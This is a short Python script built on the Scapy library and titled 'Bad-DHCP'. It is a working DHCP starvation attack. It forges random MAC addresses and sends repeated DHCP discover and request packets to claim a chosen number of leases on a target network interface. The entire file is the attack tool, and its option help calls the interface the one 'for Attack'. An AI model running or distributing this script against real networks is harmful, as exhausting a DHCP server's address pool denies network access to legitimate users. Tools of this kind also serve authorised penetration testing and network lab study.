#!./env/bin/python3

from scapy.all import *
import socket
import os
import sys
import random
import argparse
import keyboard

if not os.geteuid() == 0:
    sys.exit("\nOnly root can run this script\n")

# init option parser
parser = argparse.ArgumentParser(description='Bad-DHCP using Scapy')
parser.add_argument("-i", "--interface", help='Interface for Attack', required=True)
parser.add_argument("-t", "--timeout", type=int, help='Timeout for DHCP-Offer in seconds', required=True)
parser.add_argument("-n", "--number", type=int, help='Number of leases', required=True)
args = parser.parse_args()

# generate random MAC
def get_random_MAC():
    genMAC = f"{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}"
    return genMAC

# get new lease
def get_new_lease(macAddr, interface, timeoutInSeconds: int):
    localiface = interface
    requestMAC = macAddr
    myhostname='vektor'
    localmac = get_if_hwaddr(localiface)
    localmacraw = requestMAC.replace(':','')

    pkt = Ether(dst='ff:ff:ff:ff:ff:ff', src=macAddr, type=0x0800) / IP(src='0.0.0.0', dst='255.255.255.255') / \
        UDP(dport=67, sport=68) / BOOTP(op=1, chaddr=macAddr) / DHCP(options=[('message-type', 'discover'), 'end'])
    sendp(pkt, iface=localiface, verbose=0)
    offer = sniff(iface=localiface, filter="port 68 and port 67",
                stop_filter=lambda pkt: BOOTP in pkt and pkt[BOOTP].op == 2 and pkt[DHCP].options[0][1] == 2,
                timeout=timeoutInSeconds)
    try:
        server_mac = offer[0]["Ether"].src
        bootp_reply = offer[0]["BOOTP"]
        server_ip = bootp_reply.siaddr
        request_ip = bootp_reply.yiaddr
    except:
        print("No Offer within timeout limit")
        return
    pkt = Ether(dst='ff:ff:ff:ff:ff:ff', src=macAddr, type=0x0800) / IP(src='0.0.0.0', dst='255.255.255.255') / \
        UDP(dport=67, sport=68) / BOOTP(op=1, chaddr=macAddr) / \
        DHCP(options=[('message-type', 'request'), ("client_id", macAddr), ("requested_addr", request_ip),
                            ("server_id", server_ip), 'end'])
    sendp(pkt, iface=localiface, verbose=0)

# start here
if __name__ == "__main__":
    for i in range(args.number):
        get_new_lease(get_random_MAC(),args.interface, args.timeout)
        if keyboard.is_pressed('q'):
            print("Aborted by user.")
            break